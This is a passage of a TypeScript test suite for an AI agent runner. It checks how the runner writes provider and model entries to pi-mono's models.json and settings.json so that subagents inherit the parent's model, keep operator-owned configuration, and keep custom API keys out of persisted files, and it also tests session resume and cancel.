      // Regression: an operator typing a model id that isn't in pi-mono's
      // built-in catalogue (e.g. a freshly released Claude version, a custom
      // OpenRouter route) used to leave subagent children without a way to
      // resolve it. The child's `findInitialModel` saved-default path calls
      // `modelRegistry.find(provider, model)`, which only matches built-ins
      // and entries from models.json. We must materialize an entry under
      // `providers.<provider>.models[]` so the find() call succeeds and the
      // subagent runs on the UI-selected model instead of pi's hardcoded
      // `defaultModelPerProvider` fallback.
      it("materializes an unknown built-in-provider model into providers.<provider>.models[]", async () => {
        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "anthropic",
              api_key: "sk-ant-key",
              // Not present in the getModel mock — simulates a newly released
              // model that hasn't been added to pi-ai's catalogue yet.
              model: "claude-99-future-preview",
            }),
          }),
        );

        const modelsPath = path.join(tmpAgentDir, "models.json");
        expect(fs.existsSync(modelsPath)).toBe(true);

        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
          providers: Record<string, { models?: Array<Record<string, unknown>> }>;
        };
        const anthropic = config.providers.anthropic;
        expect(anthropic).toBeDefined();
        expect(Array.isArray(anthropic.models)).toBe(true);
        const ourModel = anthropic.models!.find((m) => m.id === "claude-99-future-preview");
        expect(ourModel).toBeDefined();
        expect(ourModel?.name).toBe("claude-99-future-preview");
        // Marker-bearing so the next sync can identify and replace this entry.
        expect(ourModel?._akmatoriManaged).toBe(true);
        // No `akmatori-custom` slot since provider is built-in.
        expect("akmatori-custom" in config.providers).toBe(false);
      });

      it("appends the managed model alongside operator-supplied models without removing them", async () => {
        // Operator may have added their own custom models under
        // providers.openai (e.g. an on-prem proxy). Our materialization must
        // append next to them, not clobber them.
        fs.mkdirSync(tmpAgentDir, { recursive: true });
        const modelsPath = path.join(tmpAgentDir, "models.json");
        fs.writeFileSync(
          modelsPath,
          JSON.stringify({
            providers: {
              openai: {
                apiKey: "operator-key",
                models: [{ id: "operator-onprem-model", contextWindow: 65536 }],
              },
            },
          }),
        );

        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "openai",
              api_key: "sk-openai-key",
              model: "gpt-99-future-preview",
            }),
          }),
        );

        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
          providers: { openai: { apiKey?: string; models?: Array<Record<string, unknown>> } };
        };
        // Operator config preserved.
        expect(config.providers.openai.apiKey).toBe("operator-key");
        const ids = (config.providers.openai.models ?? []).map((m) => m.id);
        expect(ids).toContain("operator-onprem-model");
        expect(ids).toContain("gpt-99-future-preview");
        // The akmatori-managed model is the one with the marker.
        const managed = (config.providers.openai.models ?? []).find(
          (m) => m._akmatoriManaged === true,
        );
        expect(managed?.id).toBe("gpt-99-future-preview");
      });

      it("clears stale akmatori-managed models from prior built-in providers when the active provider changes", async () => {
        // Seed a stale managed entry under providers.openai from a previous
        // session that had openai/gpt-99-old selected.
        fs.mkdirSync(tmpAgentDir, { recursive: true });
        const modelsPath = path.join(tmpAgentDir, "models.json");
        fs.writeFileSync(
          modelsPath,
          JSON.stringify({
            providers: {
              openai: {
                apiKey: "operator-key",
                models: [
                  { id: "operator-onprem-model" },
                  {
                    id: "gpt-99-old",
                    name: "gpt-99-old",
                    reasoning: true,
                    _akmatoriManaged: true,
                  },
                ],
              },
            },
          }),
        );

        // Switch to anthropic with another unknown-to-registry model id.
        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "anthropic",
              api_key: "sk-ant",
              model: "claude-99-future-preview",
            }),
          }),
        );

        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
          providers: {
            openai: { apiKey?: string; models?: Array<Record<string, unknown>> };
            anthropic: { models?: Array<Record<string, unknown>> };
          };
        };
        // Stale managed entry gone; operator-supplied entry retained.
        const openaiIds = (config.providers.openai.models ?? []).map((m) => m.id);
        expect(openaiIds).not.toContain("gpt-99-old");
        expect(openaiIds).toContain("operator-onprem-model");
        expect(config.providers.openai.apiKey).toBe("operator-key");
        // New managed entry placed under the active provider.
        const anthropicIds = (config.providers.anthropic.models ?? []).map((m) => m.id);
        expect(anthropicIds).toContain("claude-99-future-preview");
      });

      it("does not re-write models.json on second sync when the managed entry is already present", async () => {
        // Idempotency guard: the before === after short-circuit should
        // recognize that the second call produces the same provider map and
        // skip the atomic write. Otherwise mtime drift would surface as
        // spurious config-drift signals to operators.
        const params = makeExecuteParams({
          llmSettings: makeLLMSettings({
            provider: "anthropic",
            api_key: "sk-ant",
            model: "claude-99-future-preview",
          }),
        });
        await runner.execute(params);

        const modelsPath = path.join(tmpAgentDir, "models.json");
        const firstMtime = fs.statSync(modelsPath).mtimeMs;

        // Wait a tick so mtime resolution can distinguish a re-write.
        await new Promise((resolve) => setTimeout(resolve, 50));

        await runner.execute(params);
        const secondMtime = fs.statSync(modelsPath).mtimeMs;
        expect(secondMtime).toBe(firstMtime);
      });

      it("clears its own stale akmatori-custom entry when provider switches to a built-in", async () => {
        // Seed an existing models.json carrying an akmatori-managed stale
        // akmatori-custom config (marker present).
        fs.mkdirSync(tmpAgentDir, { recursive: true });
        const modelsPath = path.join(tmpAgentDir, "models.json");
        fs.writeFileSync(
          modelsPath,
          JSON.stringify({
            providers: {
              "akmatori-custom": {
                baseUrl: "https://old.example/v1",
                api: "openai-completions",
                apiKey: "sk-old",
                models: [{ id: "old-model" }],
                _akmatoriManaged: true,
              },
              anthropic: { apiKey: "ignored" },
            },
          }),
        );

        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "anthropic",
              api_key: "sk-ant-new",
              model: "claude-sonnet-4-5-20250929",
            }),
          }),
        );

        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as { providers: Record<string, unknown> };
        expect("akmatori-custom" in config.providers).toBe(false);
        expect("anthropic" in config.providers).toBe(true);
      });

      it("migrates legacy marker-bearing providers.custom entries by removing them", async () => {
        // Older versions wrote akmatori's custom config under `providers.custom`
        // with the marker. After the move to a dedicated key, those legacy
        // entries should be cleaned up so they cannot mislead an operator
        // inspecting models.json.
        fs.mkdirSync(tmpAgentDir, { recursive: true });
        const modelsPath = path.join(tmpAgentDir, "models.json");
        fs.writeFileSync(
          modelsPath,
          JSON.stringify({
            providers: {
              custom: {
                baseUrl: "https://legacy.example/v1",
                api: "openai-completions",
                apiKey: "sk-legacy",
                models: [{ id: "legacy-model" }],
                _akmatoriManaged: true,
              },
            },
          }),
        );

        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "custom",
              api_key: "akmatori-key",
              model: "akmatori-model",
              base_url: "https://akmatori.example/v1",
            }),
          }),
        );

        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
          providers: Record<string, { baseUrl?: string; apiKey?: string; models?: Array<{ id: string }> }>;
        };
        // Legacy marker-bearing custom entry is gone.
        expect("custom" in config.providers).toBe(false);
        // New akmatori-custom entry carries the current config; apiKey is the
        // env var name and the live secret is propagated via process.env.
        expect(config.providers["akmatori-custom"]?.baseUrl).toBe("https://akmatori.example/v1");
        expect(config.providers["akmatori-custom"]?.apiKey).toBe("AKMATORI_CUSTOM_PROVIDER_API_KEY");
        expect(process.env.AKMATORI_CUSTOM_PROVIDER_API_KEY).toBe("akmatori-key");
      });

      it("does not delete an operator-managed custom entry when provider switches to a built-in", async () => {
        // Seed an operator-maintained custom entry (no _akmatoriManaged marker).
        fs.mkdirSync(tmpAgentDir, { recursive: true });
        const modelsPath = path.join(tmpAgentDir, "models.json");
        fs.writeFileSync(
          modelsPath,
          JSON.stringify({
            providers: {
              custom: {
                baseUrl: "https://operator.example/v1",
                api: "openai-completions",
                apiKey: "operator-key",
                models: [{ id: "operator-model" }],
              },
            },
          }),
        );

        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "anthropic",
              api_key: "sk-ant-new",
              model: "claude-sonnet-4-5-20250929",
            }),
          }),
        );

        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
          providers: { custom?: { baseUrl?: string; apiKey?: string } };
        };
        expect(config.providers.custom).toBeDefined();
        expect(config.providers.custom?.baseUrl).toBe("https://operator.example/v1");
        expect(config.providers.custom?.apiKey).toBe("operator-key");
      });

      it("does not overwrite an operator-managed akmatori-custom slot when the active provider is custom", async () => {
        fs.mkdirSync(tmpAgentDir, { recursive: true });
        const modelsPath = path.join(tmpAgentDir, "models.json");
        fs.writeFileSync(
          modelsPath,
          JSON.stringify({
            providers: {
              "akmatori-custom": {
                baseUrl: "https://operator.example/v1",
                api: "openai-completions",
                apiKey: "operator-key",
                models: [{ id: "operator-model" }],
              },
            },
          }),
        );

        const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
        try {
          await runner.execute(
            makeExecuteParams({
              llmSettings: makeLLMSettings({
                provider: "custom",
                api_key: "akmatori-key",
                model: "akmatori-model",
                base_url: "https://akmatori.example/v1",
              }),
            }),
          );

          const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
            providers: { "akmatori-custom": { baseUrl: string; apiKey: string } };
          };
          expect(config.providers["akmatori-custom"].baseUrl).toBe("https://operator.example/v1");
          expect(config.providers["akmatori-custom"].apiKey).toBe("operator-key");
          expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining("operator-managed providers.akmatori-custom"));
        } finally {
          warnSpy.mockRestore();
        }
      });

      it("preserves a JSONC models.json (comments and trailing commas) when active provider is non-custom", async () => {
        fs.mkdirSync(tmpAgentDir, { recursive: true });
        const modelsPath = path.join(tmpAgentDir, "models.json");
        const jsoncContent = `{
  // Operator-maintained config with comments
  "providers": {
    "custom": {
      "baseUrl": "https://operator.example/v1",
      "apiKey": "operator-key", // inline comment
      "models": [{ "id": "operator-model" }],
    },
  },
}
`;
        fs.writeFileSync(modelsPath, jsoncContent);

        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "anthropic",
              api_key: "sk-ant",
              model: "claude-sonnet-4-5-20250929",
            }),
          }),
        );

        // Operator's JSONC file was understood (not unparseable) and the
        // operator-owned custom entry was kept.
        const written = fs.readFileSync(modelsPath, "utf-8");
        // The non-custom code path treats operator entries as read-only and
        // returns early without writing, so the file content is byte-identical.
        expect(written).toBe(jsoncContent);
      });

      it("leaves an unparseable models.json untouched and warns", async () => {
        fs.mkdirSync(tmpAgentDir, { recursive: true });
        const modelsPath = path.join(tmpAgentDir, "models.json");
        const garbage = "{ this is not valid json or jsonc !!! ";
        fs.writeFileSync(modelsPath, garbage);

        const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
        try {
          await runner.execute(
            makeExecuteParams({
              llmSettings: makeLLMSettings({
                provider: "custom",
                api_key: "akmatori-key",
                model: "akmatori-model",
                base_url: "https://akmatori.example/v1",
              }),
            }),
          );

          // File is preserved byte-for-byte rather than overwritten.
          expect(fs.readFileSync(modelsPath, "utf-8")).toBe(garbage);
          expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining("failed to parse"));
        } finally {
          warnSpy.mockRestore();
        }
      });

      it("tolerates null entries in providers without throwing TypeError", async () => {
        // Regression: an operator-maintained models.json could legally set
        // `providers.custom: null` or `providers.akmatori-custom: null`. The
        // previous code cast through `... | undefined` and indexed without a
        // null guard, throwing "Cannot read properties of null" on the next
        // session start. Verify both slots tolerate null values.
        fs.mkdirSync(tmpAgentDir, { recursive: true });
        const modelsPath = path.join(tmpAgentDir, "models.json");
        fs.writeFileSync(
          modelsPath,
          JSON.stringify({
            providers: {
              custom: null,
              "akmatori-custom": null,
            },
          }),
        );

        await expect(
          runner.execute(
            makeExecuteParams({
              llmSettings: makeLLMSettings({
                provider: "custom",
                api_key: "akmatori-key",
                model: "akmatori-model",
                base_url: "https://akmatori.example/v1",
              }),
            }),
          ),
        ).resolves.not.toThrow();

        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
          providers: Record<string, unknown>;
        };
        // The akmatori-custom slot was null (not operator-owned object), so
        // we are free to overwrite it with our managed entry.
        expect(typeof config.providers["akmatori-custom"]).toBe("object");
        expect(config.providers["akmatori-custom"]).not.toBeNull();
      });

      it("skips write when custom provider has no base_url and warns instead", async () => {
        const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
        try {
          await runner.execute(
            makeExecuteParams({
              llmSettings: makeLLMSettings({
                provider: "custom",
                api_key: "sk-no-baseurl",
                model: "ghost-model",
                base_url: undefined,
              }),
            }),
          );

          const modelsPath = path.join(tmpAgentDir, "models.json");
          expect(fs.existsSync(modelsPath)).toBe(false);
          expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining("custom provider missing base_url"));
        } finally {
          warnSpy.mockRestore();
        }
      });

      it("removes provider entry (not empty object) when set-then-clear of managed baseUrl leaves nothing", async () => {
        // Regression: setting a custom baseUrl for a built-in provider (e.g. an
        // on-prem OpenAI proxy) writes { openai: { baseUrl, _akmatoriManagedBaseUrl: true } }.
        // Clearing it must remove the entry entirely — an empty {} would cause
        // pi's registry to throw "must specify baseUrl, headers, compat, or models".
        // We use openai/gpt-4o because the test mock treats it as a known built-in
        // (isBuiltInModelKnown returns true), so no model entry is re-added after cleanup.
        fs.mkdirSync(tmpAgentDir, { recursive: true });
        const modelsPath = path.join(tmpAgentDir, "models.json");

        // Seed the models.json as a prior run with baseUrl set would have written it.
        fs.writeFileSync(
          modelsPath,
          JSON.stringify({
            providers: {
              openai: {
                baseUrl: "https://my-openai-proxy.example.com/v1",
                _akmatoriManagedBaseUrl: true,
              },
            },
          }),
        );

        // Now run with the same provider/model but no base_url (user cleared it).
        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "openai",
              api_key: "sk-openai-key",
              model: "gpt-4o",
              base_url: undefined,
            }),
          }),
        );

        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
          providers: Record<string, unknown>;
        };
        // The openai entry must be gone — an empty {} would cause registry failure.
        expect("openai" in config.providers).toBe(false);
      });

      // ---- models.json: provider-level compat override for minimax ----

      it("writes provider-level compat.forceAdaptiveThinking for minimax so subagents use effort-based thinking", async () => {
        // MiniMax-M3 is in pi-ai's built-in registry with api:anthropic-messages
        // but WITHOUT forceAdaptiveThinking. The child's pi process would use the
        // built-in entry directly and fall back to budget-based interleaved thinking,
        // which MiniMax's endpoint rejects. We must persist a provider-level compat
        // override in models.json so the SDK's mergeCompat applies the flag to
        // the built-in model in the child process. In tests the mock throws for
        // MiniMax-M3 (simulating unknown model), so a model entry is also written,
        // but the key assertion is the provider-level compat block.
        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "minimax",
              api_key: "sk-minimax-key",
              model: "MiniMax-M3",
            }),
          }),
        );

        const modelsPath = path.join(tmpAgentDir, "models.json");
        expect(fs.existsSync(modelsPath)).toBe(true);

        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
          providers: Record<string, {
            compat?: { forceAdaptiveThinking?: boolean };
            _akmatoriManagedCompat?: boolean;
          }>;
        };
        const minimaxEntry = config.providers.minimax;
        expect(minimaxEntry).toBeDefined();
        expect(minimaxEntry?.compat?.forceAdaptiveThinking).toBe(true);
        expect(minimaxEntry?._akmatoriManagedCompat).toBe(true);
      });

      it("removes minimax compat override from models.json when provider switches away", async () => {
        // Seed a models.json that a prior minimax run would have written.
        fs.mkdirSync(tmpAgentDir, { recursive: true });
        const modelsPath = path.join(tmpAgentDir, "models.json");
        fs.writeFileSync(
          modelsPath,
          JSON.stringify({
            providers: {
              minimax: {
                compat: { forceAdaptiveThinking: true },
                _akmatoriManagedCompat: true,
              },
            },
          }),
        );

        // Switch to anthropic with a known built-in model.
        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "anthropic",
              api_key: "sk-ant",
              model: "claude-sonnet-4-5-20250929",
            }),
          }),
        );

        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
          providers: Record<string, unknown>;
        };
        // minimax entry must be gone — cleanup strips managed compat and removes
        // the empty provider slot so pi's registry doesn't reject it.
        expect("minimax" in config.providers).toBe(false);
      });

      it("preserves operator compat flags in minimax entry when adding managed forceAdaptiveThinking", async () => {
        // If an operator already has custom compat flags in a minimax entry,
        // our managed forceAdaptiveThinking must be merged in without clobbering them.
        fs.mkdirSync(tmpAgentDir, { recursive: true });
        const modelsPath = path.join(tmpAgentDir, "models.json");
        fs.writeFileSync(
          modelsPath,
          JSON.stringify({
            providers: {
              minimax: {
                compat: { supportsLongCacheRetention: false },
              },
            },
          }),
        );

        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "minimax",
              api_key: "sk-minimax-key",
              model: "MiniMax-M3",
            }),
          }),
        );

        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
          providers: Record<string, {
            compat?: Record<string, unknown>;
            _akmatoriManagedCompat?: boolean;
          }>;
        };
        // Both flags present: operator's supportsLongCacheRetention preserved.
        expect(config.providers.minimax?.compat?.forceAdaptiveThinking).toBe(true);
        expect(config.providers.minimax?.compat?.supportsLongCacheRetention).toBe(false);
      });

      // ---- settings.json (subagent default provider+model) ----

      it("writes settings.json defaultProvider/defaultModel so subagents inherit the parent's model", async () => {
        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "anthropic",
              api_key: "sk-ant",
              model: "claude-sonnet-4-5-20250929",
            }),
          }),
        );

        const settingsPath = path.join(tmpAgentDir, "settings.json");
        expect(fs.existsSync(settingsPath)).toBe(true);
        const settings = JSON.parse(fs.readFileSync(settingsPath, "utf-8")) as {
          defaultProvider: string;
          defaultModel: string;
        };
        expect(settings.defaultProvider).toBe("anthropic");
        expect(settings.defaultModel).toBe("claude-sonnet-4-5-20250929");
      });

      it("routes settings.json defaults at the akmatori-custom slot when the active provider is custom", async () => {
        // The on-disk slot name decouples akmatori from the operator-owned
        // `providers.custom` so the child resolves the UI-selected model
        // through our managed entry, not whatever the operator put there.
        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "custom",
              api_key: "akmatori-key",
              model: "akmatori-model",
              base_url: "https://akmatori.example/v1",
            }),
          }),
        );

        const settings = JSON.parse(
          fs.readFileSync(path.join(tmpAgentDir, "settings.json"), "utf-8"),
        ) as { defaultProvider: string; defaultModel: string };
        expect(settings.defaultProvider).toBe("akmatori-custom");
        expect(settings.defaultModel).toBe("akmatori-model");
      });

      it("clears enabledModels in settings.json so the saved default is not overridden by operator scope", async () => {
        // Regression: pi's CLI applies `enabledModels` before falling back to
        // saved defaults (main.ts#buildSessionOptions), so an operator-set
        // `enabledModels: ["openai/*"]` would override our defaultProvider:
        // "anthropic" and pick the first OpenAI model in scope. We clear the
        // key so subagent subprocesses always run on the UI-selected model.
        fs.mkdirSync(tmpAgentDir, { recursive: true });
        const settingsPath = path.join(tmpAgentDir, "settings.json");
        fs.writeFileSync(
          settingsPath,
          JSON.stringify({
            theme: "operator-theme",
            enabledModels: ["openai/*"],
          }),
        );

        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "anthropic",
              api_key: "sk-ant",
              model: "claude-sonnet-4-5-20250929",
            }),
          }),
        );

        const settings = JSON.parse(fs.readFileSync(settingsPath, "utf-8")) as {
          theme: string;
          defaultProvider: string;
          defaultModel: string;
          enabledModels?: unknown;
        };
        expect(settings.theme).toBe("operator-theme");
        expect(settings.defaultProvider).toBe("anthropic");
        expect(settings.defaultModel).toBe("claude-sonnet-4-5-20250929");
        expect("enabledModels" in settings).toBe(false);
      });

      it("preserves unrelated operator settings when updating defaults", async () => {
        fs.mkdirSync(tmpAgentDir, { recursive: true });
        const settingsPath = path.join(tmpAgentDir, "settings.json");
        fs.writeFileSync(
          settingsPath,
          JSON.stringify({
            theme: "operator-theme",
            keybindings: { submit: "ctrl+enter" },
            defaultProvider: "openai",
            defaultModel: "gpt-old",
          }),
        );

        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "anthropic",
              api_key: "sk-ant",
              model: "claude-sonnet-4-5-20250929",
            }),
          }),
        );

        const settings = JSON.parse(fs.readFileSync(settingsPath, "utf-8")) as {
          theme: string;
          keybindings: { submit: string };
          defaultProvider: string;
          defaultModel: string;
        };
        expect(settings.theme).toBe("operator-theme");
        expect(settings.keybindings.submit).toBe("ctrl+enter");
        expect(settings.defaultProvider).toBe("anthropic");
        expect(settings.defaultModel).toBe("claude-sonnet-4-5-20250929");
      });

      it("parses JSONC settings.json (comments and trailing commas)", async () => {
        fs.mkdirSync(tmpAgentDir, { recursive: true });
        const settingsPath = path.join(tmpAgentDir, "settings.json");
        fs.writeFileSync(
          settingsPath,
          `{
  // Operator-maintained settings with comments
  "theme": "operator-theme",
  "defaultProvider": "openai", // outdated
  "defaultModel": "gpt-old",
}
`,
        );

        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "anthropic",
              api_key: "sk-ant",
              model: "claude-sonnet-4-5-20250929",
            }),
          }),
        );

        const settings = JSON.parse(fs.readFileSync(settingsPath, "utf-8")) as {
          theme: string;
          defaultProvider: string;
          defaultModel: string;
        };
        expect(settings.theme).toBe("operator-theme");
        expect(settings.defaultProvider).toBe("anthropic");
        expect(settings.defaultModel).toBe("claude-sonnet-4-5-20250929");
      });

      it("leaves an unparseable settings.json untouched and warns", async () => {
        fs.mkdirSync(tmpAgentDir, { recursive: true });
        const settingsPath = path.join(tmpAgentDir, "settings.json");
        const garbage = "{{ not valid json or jsonc :: ";
        fs.writeFileSync(settingsPath, garbage);

        const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
        try {
          await runner.execute(
            makeExecuteParams({
              llmSettings: makeLLMSettings({
                provider: "anthropic",
                api_key: "sk-ant",
                model: "claude-sonnet-4-5-20250929",
              }),
            }),
          );

          expect(fs.readFileSync(settingsPath, "utf-8")).toBe(garbage);
          expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining("failed to parse"));
        } finally {
          warnSpy.mockRestore();
        }
      });

      it("pins defaultThinkingLevel in settings.json so subagents honor the parent's thinking mode", async () => {
        // Custom OpenAI-compatible gateways may reject reasoning parameters when
        // the operator sets thinking to "off". Without this setting the child
        // would fall back to "medium" and send reasoning_effort, breaking the
        // child run on those endpoints.
        await runner.execute(
          makeExecuteParams({
            workDir: tmpWorkDir,
            llmSettings: makeLLMSettings({
              provider: "custom",
              api_key: "sk-custom",
              model: "custom-model",
              base_url: "https://gateway.example/v1",
              thinking_level: "off",
            }),
          }),
        );

        const globalSettings = JSON.parse(
          fs.readFileSync(path.join(tmpAgentDir, "settings.json"), "utf-8"),
        ) as { defaultThinkingLevel?: string };
        expect(globalSettings.defaultThinkingLevel).toBe("off");

        const projectSettings = JSON.parse(
          fs.readFileSync(path.join(tmpWorkDir, ".pi", "settings.json"), "utf-8"),
        ) as { defaultThinkingLevel?: string };
        expect(projectSettings.defaultThinkingLevel).toBe("off");
      });

      it("writes settings.json at workDir/.pi/ so a project-scope file cannot shadow our defaults", async () => {
        // pi-mono merges global with project settings, project taking precedence
        // (FileSettingsStorage in pi-mono settings-manager.ts). Writing only the
        // global file would leave subagents vulnerable to a workspace-local
        // settings.json — pre-existing, operator-supplied, or written by the
        // agent itself during the run — silently overriding the parent's model.
        await runner.execute(
          makeExecuteParams({
            workDir: tmpWorkDir,
            llmSettings: makeLLMSettings({
              provider: "anthropic",
              api_key: "sk-ant",
              model: "claude-sonnet-4-5-20250929",
              thinking_level: "high",
            }),
          }),
        );

        const projectPath = path.join(tmpWorkDir, ".pi", "settings.json");
        expect(fs.existsSync(projectPath)).toBe(true);
        const projectSettings = JSON.parse(fs.readFileSync(projectPath, "utf-8")) as {
          defaultProvider: string;
          defaultModel: string;
          defaultThinkingLevel: string;
        };
        expect(projectSettings.defaultProvider).toBe("anthropic");
        expect(projectSettings.defaultModel).toBe("claude-sonnet-4-5-20250929");
        expect(projectSettings.defaultThinkingLevel).toBe("high");
      });

      it("project workDir/.pi/settings.json overrides pre-existing project defaults that would shadow the parent", async () => {
        // Simulate a workspace polluted by either a previous run or an
        // operator-mounted volume carrying a different defaultProvider/model.
        const projectDir = path.join(tmpWorkDir, ".pi");
        fs.mkdirSync(projectDir, { recursive: true });
        fs.writeFileSync(
          path.join(projectDir, "settings.json"),
          JSON.stringify({
            defaultProvider: "openai",
            defaultModel: "gpt-old",
            defaultThinkingLevel: "low",
            enabledModels: ["openai/*"],
            theme: "operator-project-theme",
          }),
        );

        await runner.execute(
          makeExecuteParams({
            workDir: tmpWorkDir,
            llmSettings: makeLLMSettings({
              provider: "anthropic",
              api_key: "sk-ant",
              model: "claude-sonnet-4-5-20250929",
              thinking_level: "high",
            }),
          }),
        );

        const projectSettings = JSON.parse(
          fs.readFileSync(path.join(projectDir, "settings.json"), "utf-8"),
        ) as {
          defaultProvider: string;
          defaultModel: string;
          defaultThinkingLevel: string;
          enabledModels?: unknown;
          theme: string;
        };
        // Parent's values win over the polluted project file.
        expect(projectSettings.defaultProvider).toBe("anthropic");
        expect(projectSettings.defaultModel).toBe("claude-sonnet-4-5-20250929");
        expect(projectSettings.defaultThinkingLevel).toBe("high");
        // enabledModels gets cleared so it cannot scope-restrict the saved default.
        expect("enabledModels" in projectSettings).toBe(false);
        // Unrelated operator preferences survive.
        expect(projectSettings.theme).toBe("operator-project-theme");
      });

      it("propagates the custom-provider apiKey through process.env, not the persisted models.json file", async () => {
        // Regression: writing the raw apiKey into models.json (which lives on
        // the agent's persistent home volume at /home/agent/.pi/agent/models.json)
        // means the secret is readable by every future agent/tool execution.
        // We instead write an env var NAME and set the env var so the child
        // process inherits it without on-disk persistence of the literal.
        delete process.env.AKMATORI_CUSTOM_PROVIDER_API_KEY;
        await runner.execute(
          makeExecuteParams({
            workDir: tmpWorkDir,
            llmSettings: makeLLMSettings({
              provider: "custom",
              api_key: "sk-secret-custom-key",
              model: "custom-model",
              base_url: "https://gateway.example/v1",
            }),
          }),
        );

        const modelsPath = path.join(tmpAgentDir, "models.json");
        const raw = fs.readFileSync(modelsPath, "utf-8");
        // Literal key must not appear anywhere in the persisted file.
        expect(raw).not.toContain("sk-secret-custom-key");
        const config = JSON.parse(raw) as {
          providers: { "akmatori-custom": { apiKey: string } };
        };
        expect(config.providers["akmatori-custom"].apiKey).toBe("AKMATORI_CUSTOM_PROVIDER_API_KEY");
        // The env var carries the live secret so the child resolves it.
        expect(process.env.AKMATORI_CUSTOM_PROVIDER_API_KEY).toBe("sk-secret-custom-key");
      });
    });
  });

  // -----------------------------------------------------------------------
  // resume
  // -----------------------------------------------------------------------

  describe("resume", () => {
    it("should create a new session and prompt with the message", async () => {
      const params = makeResumeParams({ message: "Also check disk space" });
      const result = await runner.resume(params);

      expect(mockSession.prompt).toHaveBeenCalledWith("Also check disk space");
      expect(result.session_id).toBe("mock-session-123");
    });

    it("should return ExecuteResult with metrics", async () => {
      const result = await runner.resume(makeResumeParams());

      expect(result.tokens_used).toBe(1500);
      expect(result.execution_time_ms).toBeGreaterThanOrEqual(0);
      expect(result.error).toBeUndefined();
    });

    it("should handle resume errors gracefully", async () => {
      mockSession.prompt.mockRejectedValueOnce(new Error("Session expired"));

      const result = await runner.resume(makeResumeParams());

      expect(result.error).toBe("Session expired");
    });
  });

  // -----------------------------------------------------------------------
  // cancel
  // -----------------------------------------------------------------------

  describe("cancel", () => {
    it("should abort active session", async () => {
      // Start an execution that we can cancel
      const session = createMockSession();
      // Make prompt hang so we can cancel it
      session.prompt.mockImplementation(() => new Promise(() => {}));

      // We need to inject the session into activeSessions
      // Do this by starting execute (it won't resolve because prompt hangs)
      mockSession = session;
      const execPromise = runner.execute(makeExecuteParams({ incidentId: "inc-cancel" }));

      await waitForCondition(() => runner.hasActiveSession("inc-cancel"));

      expect(runner.hasActiveSession("inc-cancel")).toBe(true);

      await runner.cancel("inc-cancel");

      expect(session.abort).toHaveBeenCalled();
      expect(runner.hasActiveSession("inc-cancel")).toBe(false);
    });

    it("should be a no-op for unknown incident ID", async () => {
      // Should not throw
      await runner.cancel("nonexistent-incident");
    });

    it("should trigger signal propagation to active tool calls via session.abort()", async () => {
      // Verify that cancel() calls session.abort() which in pi-mono 0.63.1
      // propagates the AbortSignal to all active tool execute() calls.
      const session = createMockSession();
      let abortCalled = false;
      session.abort.mockImplementation(async () => {
        abortCalled = true;
      });
      session.prompt.mockImplementation(() => new Promise(() => {})); // hang

      mockSession = session;
      const execPromise = runner.execute(makeExecuteParams({ incidentId: "inc-signal-prop" }));

      await waitForCondition(() => runner.hasActiveSession("inc-signal-prop"));
      expect(runner.hasActiveSession("inc-signal-prop")).toBe(true);

      await runner.cancel("inc-signal-prop");

      expect(abortCalled).toBe(true);
      expect(session.abort).toHaveBeenCalledTimes(1);
      expect(runner.hasActiveSession("inc-signal-prop")).toBe(false);
    });

    // Models the supersession race: run 1 is in-flight, run 2 has already
    // installed its session in activeSessions, then run 1's cancel resolves
    // session.abort(). cancel() must NOT delete run 2's slot — that would
    // leave the live replacement run untracked so a later
    // cancel/abortInFlightSession would no-op and overlapping sessions could
    // recur. The compare-and-delete in cancel() guards against this.
    it("should not delete activeSessions slot when a replacement session has taken over", async () => {
      const session1 = createMockSession();
      const session2 = createMockSession();

      // Cancel awaits session1.abort(); during that await we plant session2
      // as the current owner of the slot, modelling the orchestrator having
      // moved on to run 2 while run 1 is still tearing down.
      session1.abort.mockImplementation(async () => {
        runner["activeSessions"].set("inc-replace", session2 as any);
      });

      runner["activeSessions"].set("inc-replace", session1 as any);

      await runner.cancel("inc-replace");

      // session2 must still be the live entry — cancel must not have
      // clobbered it after session1's abort resolved.
      expect(runner["activeSessions"].get("inc-replace")).toBe(session2 as any);
      expect(runner.hasActiveSession("inc-replace")).toBe(true);
    });
  });
